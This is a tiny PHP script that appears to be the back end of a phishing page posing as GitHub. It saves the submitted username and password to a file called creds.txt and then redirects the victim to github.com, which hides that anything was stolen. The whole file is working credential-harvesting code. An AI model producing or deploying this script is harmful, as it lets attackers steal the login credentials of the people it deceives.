<?php
file_put_contents("creds.txt", "[**] Username: " . $_POST['login'] . " Pass: " . $_POST['password']);
header('Location: https://github.com/');
exit();
?>
